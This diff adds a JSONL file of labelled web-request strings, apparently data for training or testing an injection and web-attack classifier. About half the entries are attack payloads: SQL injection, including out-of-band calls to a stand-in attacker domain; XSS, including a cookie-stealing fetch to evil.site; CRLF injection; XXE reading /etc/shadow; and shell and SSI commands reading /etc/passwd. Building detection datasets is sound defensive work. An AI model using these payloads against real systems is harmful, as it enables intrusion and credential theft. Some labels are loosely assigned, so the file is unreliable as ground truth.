@@ -1,0 +1,747 @@
+{"text": "sku,name,model,price,quantity\nET1001,Smart TV,32XHD4K,499.99,25\nET1002,Wireless Headphones,WH3000NC,259.00,40\nET1003,Smartphone,OpusZ10,799.95,30", "kind": "benign"}
+{"text": "FROM the archives SELECT highlights", "kind": "benign"}
+{"text": "/static/../../../../proc/self/environ", "kind": "path_traversal"}
+{"text": "category=electronics&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "status=active&sort=joined_date", "kind": "benign"}
+{"text": "search_term=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "layout=../../../../etc/group\u0000config; sid=3e7d4c9b1a2f", "kind": "path_traversal"}
+{"text": "/user/avatar/../../../../proc/self/environ", "kind": "path_traversal"}
+{"text": "prod_code=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "INSERT new models", "kind": "benign"}
+{"text": "account=active&account=' OR 1=1--", "kind": "sqli"}
+{"text": "template_path=../../../../var/www/html/includes/header.php\u0000us-UK; session_id=gd2731jxn29v", "kind": "path_traversal"}
+{"text": "sid=6d5a4b2f0e74b7c2a1d8f9724680ab11", "kind": "benign"}
+{"text": "{\n  \"callback_url\": \"/checkout/complete\r\nLocation: https://example.com/login\r\nContent-Type: text/html\r\n\r\n<script>top.location='https://example.com'</script>\",\n  \"notifications\": false\n}", "kind": "xss"}
+{"text": "/items/details/12345\r\nX-CRLF-Test:Injected\r\n\r\n<script>console.log('x')</script>", "kind": "xss"}
+{"text": "{\"callback_url\": \"https://example.com/callback\r\nSet-Cookie: sessionid=malicious;HttpOnly\r\nLocation: http://example.com\r\n\r\n<script>alert(1)</script>\"}", "kind": "xss"}
+{"text": "/search/query\r\nCache-Control: no-store\r\nContent-Length: 18\r\n\r\n<script>doEvil()</script>", "kind": "xss"}
+{"text": "orderId=54321&status=shipped' }, $set: {priority: 'high'} --", "kind": "sqli"}
+{"text": "search=FROM%20the%20archives%20SELECT%20highlights", "kind": "benign"}
+{"text": "filter[type]=admin&filter[active]=true", "kind": "benign"}
+{"text": "example.com('Custom script executed');", "kind": "benign"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCh3aW5kb3cubG9jYXRpb24uaHJlZik8L3NjcmlwdD4=\"></iframe>", "kind": "xss"}
+{"text": "/blog/article/view\r\nX-Test-Header: value\r\nContent-Length: 17\r\n\r\n<script>evilCode()</script>", "kind": "xss"}
+{"text": "best hiking trails colorado", "kind": "benign"}
+{"text": "id=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "/../../../private/data/export.csv", "kind": "path_traversal"}
+{"text": "q=coding+best+practices+python", "kind": "benign"}
+{"text": "console.log('Dynamic load OK');", "kind": "benign"}
+{"text": "remote work time management", "kind": "benign"}
+{"text": "email=samuel.jackson%example.com&referrer=", "kind": "benign"}
+{"text": "utm_medium=push_notification&utm_source=app_notifications", "kind": "benign"}
+{"text": "id=123&id=' UNION SELECT credit_card FROM users--&filter_evil_chars=true&category=smartphones", "kind": "sqli"}
+{"text": "ReportGen/3.2 $(cat /etc/passwd)", "kind": "path_traversal"}
+{"text": "param=Hello%2520World", "kind": "benign"}
+{"text": "sid=3d8eaa7c3f574451b1c769bd0c5a767d; preferred_theme=dark", "kind": "benign"}
+{"text": "theme=dark&id=123&id=' UNION SELECT credit_card FROM users--&filter_evil_chars=true", "kind": "sqli"}
+{"text": "filter=active&sort=desc", "kind": "benign"}
+{"text": "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)/*-*/", "kind": "sqli"}
+{"text": "report_id=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "book_title=Programming' or '1'='1", "kind": "sqli"}
+{"text": "log_id=abc123&source=server01&summary=QmFzZTY0IGVuY29kZWQgc3VtbWFyeSBvZiBsb2cgZmlsZSB1cGxvYWQu&details=Tm8gb3V0YWdlIHByb2JsZW1zIGxvY2F0ZWQu", "kind": "benign"}
+{"text": "wget/1.21.3 (linux-gnu)", "kind": "benign"}
+{"text": "id=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cinfo%27%29%29%29--%20", "kind": "sqli"}
+{"text": "/images/avatars/../../../../var/log/auth.log", "kind": "path_traversal"}
+{"text": "/api/v1/data/fetch/\r\nX-Api-Key: maliciouskey\r\n\r\n<script>evil()</script>", "kind": "xss"}
+{"text": "page_template=../../../../var/www/html/index.php\u0000default", "kind": "path_traversal"}
+{"text": "{\"searchTerm\": \"Action RPG' oR 1=1 -- -\", \"filters\": {\"platform\": \"PC\", \"minRating\": 8}}", "kind": "sqli"}
+{"text": "user=client82; tracking_id=qm23' OR IF(ASCII(SUBSTRING((SELECT password FROM users /*!*/ WHERE username='admin'),1,1))=97, SLEEP(5),0) --", "kind": "sqli"}
+{"text": "username=brad123&password=letmein&note=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "{\"bio\": \"Collector of rare &lt;strong&gt;vinyl&lt;/strong&gt; records &amp; live jazz fan.\", \"preferred_store\": \"downtown\"}", "kind": "benign"}
+{"text": "template_name=main<!--#exec cmd=\"cat /etc/passwd\"-->", "kind": "path_traversal"}
+{"text": "searchTerm=&lt;script&gt;alert(&#39;XSS_ Vulnerability_Found&#39;)&lt;/script&gt;", "kind": "xss"}
+{"text": "userid=298374&fields=name,email,birthday&callback=processData", "kind": "benign"}
+{"text": "Business Analyst", "kind": "benign"}
+{"text": "Mozilla/5.0 \"><svg/onload=eval(atob('YWxlcnQoIkNoYXRCdWQgQXR0YWNrIik='))>", "kind": "xss"}
+{"text": "Interested in your services for digital transformation.", "kind": "benign"}
+{"text": "{\"query\":\"testUser\",\"filter\":\"active\",\"notes\":\"requested' And (SeLeCt Count(*) from admins) > 0 -- \"}", "kind": "sqli"}
+{"text": "cmd=view_details&id=83210", "kind": "benign"}
+{"text": "search_term=smartphones' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "/api/v1/resources/data\r\nSet-Cookie: sessionId=abc123\r\nContent-Length: 28\r\n\r\n<script>alert('hacked')</script>", "kind": "xss"}
+{"text": "<order>\n  <customer>Linda Barrett</customer>\n  <productID>5698</productID>\n  <quantity>2</quantity>\n  <priority>standard</priority>\n</order>", "kind": "benign"}
+{"text": "/search/query\r\nX-Custom-Injected:payload\r\nContent-Length: 29\r\n\r\n<script>evil()</script>extra", "kind": "xss"}
+{"text": "/resources/icons/../../../../var/www/html/index.php", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE shipment [\n  <!ELEMENT shipment ANY >\n  <!ENTITY shadow SYSTEM \"file:///etc/shadow\" >]>\n<shipment>\n  <code>4983</code>\n  <credential>&shadow;</credential>\n</shipment>", "kind": "path_traversal"}
+{"text": "lang_pref=../../../../windows/win.ini\u0000en-US; auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "kind": "path_traversal"}
+{"text": "q=headphones&sort=price_asc", "kind": "benign"}
+{"text": "id=23' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "warehouse=nyc&available=true", "kind": "benign"}
+{"text": "product=987&filter_evil_chars=true&product=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<product>\n  <productId>&xxe;</productId>\n  <description>Some product</description>\n</product>", "kind": "path_traversal"}
+{"text": "id=456&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "This is the latest text update for item123.", "kind": "benign"}
+{"text": "{\"UNION ALL\": \"notification_settings_modified\"}", "kind": "benign"}
+{"text": "tool_option=203.0.113.5; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "San Diego", "kind": "benign"}
+{"text": "page=../../../../../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "Mozilla/5.0 \"><svg/onload=eval(atob('YWxlcnQoIkVjb2xvZ2ljYWwgSGFjayIp'))>", "kind": "xss"}
+{"text": "{\n  \"callback_url\": \"/upload/complete\r\nContent-Type: text/html\r\nLocation: http://example.com/payload\r\n\r\n<script>document.location='http://example.com/'</script>\",\n  \"file_id\": \"56db7f82\"\n}", "kind": "xss"}
+{"text": "user_id=4587&subject=Login+issue&description=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "location=Seattle", "kind": "benign"}
+{"text": "q=phone&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--&filter=active", "kind": "sqli"}
+{"text": "{\"username\": \"shopper42\", \"password\": \"p@ssword123' oR 1=1--\"}", "kind": "sqli"}
+{"text": "user=client&level=standard&user=admin&level=administrator&note=all+set&note=<script>alert(1)</script>", "kind": "xss"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE info [\n  <!ELEMENT info ANY >\n  <!ENTITY pass SYSTEM \"file:///etc/shadow\" >\n]>\n<info>\n  <account>&pass;</account>\n  <details>Confidential</details>\n</info>", "kind": "path_traversal"}
+{"text": "post_content=Check these logs <!--#eXeC cMd=\"cat /etc/passwd\"-->", "kind": "path_traversal"}
+{"text": "Bingbot/2.0 (+http://example.com/bingbot.htm)", "kind": "benign"}
+{"text": "coupon_code=SAVE20']},{$set:{isAdmin:true}} --", "kind": "sqli"}
+{"text": "user=payuser\u0000\u0000\b\u0001<script>prompt(123)</script>&password=pa$$w0rdSecure", "kind": "xss"}
+{"text": "Mozilla/5.0 <marquee onstart=alert('LogViewerXSS')>ScrollingText</marquee> AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15", "kind": "xss"}
+{"text": "username=PlayerOne&rating=5&comments=Great+forum+response+time!", "kind": "benign"}
+{"text": "/downloads/docs/../../../etc/shadow", "kind": "path_traversal"}
+{"text": "------CustomBoundary\t1234\nContent-Disposition: form-data; name=\"meta\"\n\nconfiguration batch upload\n------CustomBoundary\t1234\nContent-Disposition: form-data; name=\"file\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/", "kind": "path_traversal"}
+{"text": "login=admin') and substring(concat(substring(//accounts/account[1]/password,2,2),'@@@'),3,1)='3'--&pin=0000", "kind": "sqli"}
+{"text": "post=123&post=456' OR '1'='1", "kind": "sqli"}
+{"text": "coding best practices python", "kind": "benign"}
+{"text": "post=654&filter_evil_chars=true&post=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "query=param=Hello%252520World&limit=10", "kind": "benign"}
+{"text": "user_bio=Media+producer+and+editor+<!--#InClUdE+FiLe=\"/etc/passwd\"+-->", "kind": "path_traversal"}
+{"text": "name=Elena+Kovalski&message=%3Crequest%3ECan+you+customize+the+blue+vase+with+my+initials%3F%3C%2Frequest%3E&preferred_contact=email", "kind": "benign"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE data [\n<!ELEMENT data ANY >\n<!ENTITY exploit SYSTEM \"file:///etc/passwd\" >]>\n<request>\n  <id>5467</id>\n  <secret>&exploit;</secret>\n</request>", "kind": "path_traversal"}
+{"text": "record=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "query=handmade+pottery&filter%5Bprice_range%5D=0-50&sort_by=newest&page=2", "kind": "benign"}
+{"text": "language=../../../../etc/hosts\u0000en", "kind": "path_traversal"}
+{"text": "username=syncuser\u0000\u0001\b<script>confirm(1)</script>&password=syncPass!123", "kind": "xss"}
+{"text": "id=7021", "kind": "benign"}
+{"text": "search_term=electronics' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "Price update: now 19.99 USD.", "kind": "benign"}
+{"text": "c3VwZXJzZWNyZXR0bzEyMw==", "kind": "benign"}
+{"text": "sort=asc&sort=desc&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "{\"postId\":7890,\"author\":\"devUser\",\"comment\":\"Nice game! Also ' Or 'x'='X' -- try to bypass\"}", "kind": "sqli"}
+{"text": "report_id=2021&report_id=2021' OR '1'='1", "kind": "sqli"}
+{"text": "query=best+hiking+trails+colorado", "kind": "benign"}
+{"text": "q=latest+smartphone+reviews", "kind": "benign"}
+{"text": "userid=5') and substring(concat(//profiles/user[1]/password,'ZZZ'),string-length(//profiles/user[1]/password),1)='d'--&search=overview", "kind": "sqli"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE req [\n<!ELEMENT req ANY >\n<!ENTITY p SYSTEM \"file:///etc/passwd\" >]>\n<order>\n  <reference>ABCD1234</reference>\n  <payload>&p;</payload>\n</order>", "kind": "path_traversal"}
+{"text": "/account/verify-email\r\nX-Injected-Status: 400\r\nContent-Length: 18\r\n\r\n<script>alert(2)</script>", "kind": "xss"}
+{"text": "track_id=vid79872104; region=us-west", "kind": "benign"}
+{"text": "user_id=789; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)#", "kind": "sqli"}
+{"text": "visitor_id=7421; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0) -- -", "kind": "sqli"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGFja2VkIScpPC9zY3JpcHQ+\"></iframe>", "kind": "xss"}
+{"text": "Mozilla/5.0 \"><script>eval(atob('YWxlcnQoMSkp'))</script> (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "kind": "xss"}
+{"text": "{\"username\": \"james_walter\", \"password\": \"PaSsWoRd' Or '1'='1\"}", "kind": "sqli"}
+{"text": "/public/downloads/../../etc/shadow", "kind": "path_traversal"}
+{"text": "user=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "Mozilla/5.0 \"><svg/onload=eval(atob('YWxlcnQoImNvb2tpZXMiKQ=='))>", "kind": "xss"}
+{"text": "query=%4a%5b%6C%7d&category=books&sort=date", "kind": "benign"}
+{"text": "{\"comment\": \"Great game!\", \"redirect_url\": \"/comments/view\r\nServer: InjectedServer\r\nLocation: http://example.com\r\n\r\n<script>stealCookies()</script>\"}", "kind": "xss"}
+{"text": "name=&lt;script&gt;alert(&#39;XSS_ Vulnerability_Found&#39;)&lt;/script&gt;", "kind": "xss"}
+{"text": "function validate() { return true; }", "kind": "benign"}
+{"text": "location=seattle&units=metric&callback=processData", "kind": "benign"}
+{"text": "/files/downloads/../../../var/log/auth.log", "kind": "path_traversal"}
+{"text": "{\n  \"article_id\": \"112233\",\n  \"metadata\": {\n    \"author\": \"jane_doe\",\n    \"debug_info\": \"<!--#exec cmd=\\\"$(echo c)$(echo a)$(echo t) /etc/passwd\\\"-->\"\n  }\n}", "kind": "path_traversal"}
+{"text": "{\"UNION ALL\": \"new_alert_triggered\"}", "kind": "benign"}
+{"text": "id=1024&currency=usd&discountApplied=false", "kind": "benign"}
+{"text": "{\"UNION ALL\": \"monthly_report_requested\"}", "kind": "benign"}
+{"text": "target=203.0.113.9; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "region=us-east", "kind": "benign"}
+{"text": "visitor_id=38274f9a526; tracking_id=xyz' OR IF(SUBSTRING(DATABASE(),1,1)='a'/**/ ,WAITFOR DELAY '0:0:5' , 0)#; pref=darkmode", "kind": "sqli"}
+{"text": "category=9' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "------Boundary123456\nContent-Disposition: form-data; name=\"description\"\n\nUpload for XML import\n------Boundary123456\nContent-Disposition: form-data; name=\"xmlFile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.i", "kind": "path_traversal"}
+{"text": "page=12", "kind": "benign"}
+{"text": "order_ref=A12F3' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "dashboard_view=../../../../../../etc/shadow\u0000json", "kind": "path_traversal"}
+{"text": "/news/2023/04/05/top-story\r\nServer: Compromised\r\n\r\n<script>alert('compromise')</script>", "kind": "xss"}
+{"text": "sessionid=abc123&mode=active&sessionid=admin456&mode=delete&command=<script>xss()</script>", "kind": "xss"}
+{"text": "article_id=738&user=edtech_fan&comment=VGhpcyBpcyBhIHZlcnkgdXNlZnVsIGFydGljbGUgc2VjdGlvbiBhYm91dCB0ZWNobm9sb2d5IGluIGVkdWNhdGlvbi4=", "kind": "benign"}
+{"text": "lang_pref=../../../../etc/passwd\u0000en-US", "kind": "path_traversal"}
+{"text": "--PyBoundary1234Xyz\nContent-Disposition: form-data; name=\"notes\"\n\nHealthcare device config upload\n--PyBoundary1234Xyz\nContent-Disposition: form-data; name=\"configFile\"; filename=\"device_config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/w", "kind": "path_traversal"}
+{"text": "{\"user\": \"samwise\", \"profileDesc\": \"Admin panel access' AnD SeLeCt 1 FrOm users WhErE 'a'='a\"}", "kind": "sqli"}
+{"text": "<searchRequest>\n  <term>' or '1'='1' or name()='</term>\n  <category>electronics</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "/chat/room/42/user\r\nInjected-Header:InjectedValue\r\n\r\n<script>alert('xss')</script>", "kind": "xss"}
+{"text": "first_name=Alice&last_name=&email=alice.wong%example.com", "kind": "benign"}
+{"text": "Patch note: resolved issue with sync.", "kind": "benign"}
+{"text": "item_code=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "username=alice&rating=5&message=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "search=UNION%20all%20articles", "kind": "benign"}
+{"text": "{\"title\":\"New Game Feature Release\",\"content\":\"Check out this amazing bug fix! <script>fetch('https://evil.site/log?cookie='+document.cookie)</script>\",\"tags\":[\"update\",\"bugfix\"]}", "kind": "xss"}
+{"text": "category=home-decor&filter%5Bstyle%5D=scandinavian&filter%5Bprice_range%5D=50-200&sort_by=best_sellers&page=10", "kind": "benign"}
+{"text": "lang_pref=../../../../var/log/auth.log\u0000default; sid=fa6472863ae42381", "kind": "path_traversal"}
+{"text": "book_title=Gone Girl' or @publisher='Penguin' or '1'='1", "kind": "sqli"}
+{"text": "{\"form-data.field_1\":\"John\",\"form.data-field-2\":\"Smith\",\"additional-info.notes\":\"No allergies\",\"custom_meta.version-id\":\"3.1.7\"}", "kind": "benign"}
+{"text": "auth=token123; tracking_id=' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61,SLEEP(5),0)#; prefs=lang:en", "kind": "sqli"}
+{"text": "/dashboard/data/report\r\nSet-Cookie: auth=eviltoken12345\r\nContent-Length: 28\r\n\r\n<script>console.log('xss')</script>", "kind": "xss"}
+{"text": "thread=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "user_theme=../../../var/www/html/config.php\u0000darkmode", "kind": "path_traversal"}
+{"text": "cmd=view_details&user=8742", "kind": "benign"}
+{"text": "email_notifications=on&marketing_emails=off&timezone=America%2FNew_York", "kind": "benign"}
+{"text": "{\"filePath\":\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\"}", "kind": "path_traversal"}
+{"text": "theme_file=../../../../etc/apache2/httpd.conf\u0000modern", "kind": "path_traversal"}
+{"text": "Mozilla/5.0 <script>alert('LogViewerXSS')</script>", "kind": "xss"}
+{"text": "lang=en-US; tracking_id=QxZb' OR IF(ASCII(SUBSTRING((SELECT password /*!FROM*/ users /*!WHERE*/ username='admin'),1,1))=0x61, SLEEP(5),0) -- ; promo_seen=yes", "kind": "sqli"}
+{"text": "article_id=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cposts%27%29%29%29--%20", "kind": "sqli"}
+{"text": "<searchRequest><term>' or '1'='1' or name()='</term><category>gadgets</category></searchRequest>", "kind": "sqli"}
+{"text": "ReportViewer/3.3; echo \"UA-Header: $(cat /etc/passwd)\" >> /var/log/us.log", "kind": "path_traversal"}
+{"text": "filter=popular&filter_evil_chars=true&filter=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "/user/profile/edit/alpha\r\nX-Attack: true\r\n\r\n<script>document.cookie</script>", "kind": "xss"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnbG9uZycpeDwvc2NyaXB0Pg==\"></iframe>", "kind": "xss"}
+{"text": "{\"filePath\": \"C:\\\\Windows\\\\System32\\\\config\\\\SAM\"}", "kind": "path_traversal"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydChjb25maWcpPC9zY3JpcHQ+\"></iframe>", "kind": "xss"}
+{"text": "sort=latest&filter=unread&highlight_user=chris24&show_signature=true&include_attachments=false&page=1&per_page=25&lang=en-US&theme=dark&show_online_status=true", "kind": "benign"}
+{"text": "WHERE quantity >0", "kind": "benign"}
+{"text": "id=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "articleid=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "how to bake bread", "kind": "benign"}
+{"text": "id=1024&verbose=true", "kind": "benign"}
+{"text": "item_id=105' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"uploadType\"\n\nconfiguration\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM", "kind": "path_traversal"}
+{"text": "/public/docs/../../../var/log/apache2/access.log", "kind": "path_traversal"}
+{"text": "username=player123&action=update&comment=all+good&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "v=3.4.7", "kind": "benign"}
+{"text": "/public/avatars/../../../../proc/self/environ", "kind": "path_traversal"}
+{"text": "query=wireless+headphones&sort=popularity&callback=processData", "kind": "benign"}
+{"text": "book_title=1984' or '1'='1--", "kind": "sqli"}
+{"text": "query=how%20to%20bake%20bread", "kind": "benign"}
+{"text": "product_id=11247&user_id=58762&rating=4&review=SGVsbG8sIHNsdXBidWxseSBsaWtlZCB0aGUgcHJvZHVjdCBoYXMgeW91ciBzdG9yZS4gU3RhYmlsaXR5IGlzIGZzdCBob3BlLg==", "kind": "benign"}
+{"text": "/account/login\r\nSet-Cookie: auth=malicious\r\nContent-Length: 16\r\n\r\n<script>bad()</script>", "kind": "xss"}
+{"text": "user=alice&user=alice'--", "kind": "sqli"}
+{"text": "username=tony_lee&welcome_message=%3Cgreeting%3EExcited+to+join+the+community%21%3C%2Fgreeting%3E&referral_code=NEWMEM24", "kind": "benign"}
+{"text": "{\"userId\": \"7890\", \"imageName\": \"profile.png\", \"description\": \"Profile image' Or '0'='0\"}", "kind": "sqli"}
+{"text": "user_id=824&active=true", "kind": "benign"}
+{"text": "{\"bio\":\"Tech enthusiast &lt;em&gt;who loves&lt;/em&gt; open-source &amp; data science.\",\"language\":\"en\",\"newsletter\":false}", "kind": "benign"}
+{"text": "DROP the oldest", "kind": "benign"}
+{"text": "search_term=42' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "--EduPlatformBnd9870\nContent-Disposition: form-data; name=\"metadata\"\n\nEducation config upload batch 17\n--EduPlatformBnd9870\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/wi", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE input [\n<!ELEMENT input ANY >\n<!ENTITY passwd SYSTEM \"file:///etc/passwd\" >]>\n<request>\n  <userToken>xyz</userToken>\n  <inputData>&passwd;</inputData>\n</request>", "kind": "path_traversal"}
+{"text": "category=books&sort=title", "kind": "benign"}
+{"text": "{\"query\":{\"$where\":\"function sleep(ms){var start=Date.now();while(Date.now()-start < ms){}return true;} return this.username === 'admin' && this.password.startsWith('a') || sleep(5000)\"}}", "kind": "sqli"}
+{"text": "user_id=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%27.secure-login.cloud%5C%5Cuserdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "search_term=3' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "{\"username\":\"adminUser\",\"password\":\"password' Or '1'='1\"}", "kind": "sqli"}
+{"text": "user_bio=Shop+owner+and+enthusiast+<!--#InClUdE+FiLe=\"/etc/passwd\"+-->", "kind": "path_traversal"}
+{"text": "member_id=789&member_id=789' OR 1=1", "kind": "sqli"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE order [\n<!ELEMENT order ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<product>\n  <productId>&xxe;</productId>\n  <description>Some product</description>\n</product>", "kind": "path_traversal"}
+{"text": "id=456&id=' OR 1=1--", "kind": "sqli"}
+{"text": "item_id=457&quantity=2&item_id=9999&quantity=99&note=Please+handle+with+care+<script>xss()</script>", "kind": "xss"}
+{"text": "user=alpha&filter_evil_chars=true&id=42&id=42' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "uid=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "theme_file=../../../../themes/default/main.css\u0000en-GB; jwt=eyJhbGciOiJSUzI1NiIsImtpZCI6IjY2NjY2In0", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE order [\n  <!ELEMENT order ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n<order>\n  <productId>&xxe;</productId>\n  <quantity>10</quantity>\n</order>", "kind": "path_traversal"}
+{"text": "{\"UNION ALL\": \"user_preferences_updated\"}", "kind": "benign"}
+{"text": "query=jane.doe&age_min=25&age_max=40&location=Boston&interests=travel,fashion&sort_by=last_active&limit=10&offset=0&verified=true&include_blocked=false&expand=profile_photos", "kind": "benign"}
+{"text": "region=us-west&upcoming_only=true&max_results=25", "kind": "benign"}
+{"text": "user_template=../../../../etc/hosts\u0000.log; sessionid=3f1c9d7e5a42fa7c8e9f19b7e8a4c1d2", "kind": "path_traversal"}
+{"text": "------uploadBoundary98Hdsl23\nContent-Disposition: form-data; name=\"uploadName\"\n\ngameConfigFile\n------uploadBoundary98Hdsl23\nContent-Disposition: form-data; name=\"configuration\"; filename=\"configdata.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:/", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE order [\n<!ELEMENT order ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<order>\n  <orderId>&xxe;</orderId>\n  <note>Regular order processing</note>\n</order>", "kind": "path_traversal"}
+{"text": "user_template=../../../../etc/passwd\u0000.html; session_token=9f4d7a2b1c840e3f12a9d5bb", "kind": "path_traversal"}
+{"text": "theme=../../../../usr/local/lib/locale/settings\u0000light", "kind": "path_traversal"}
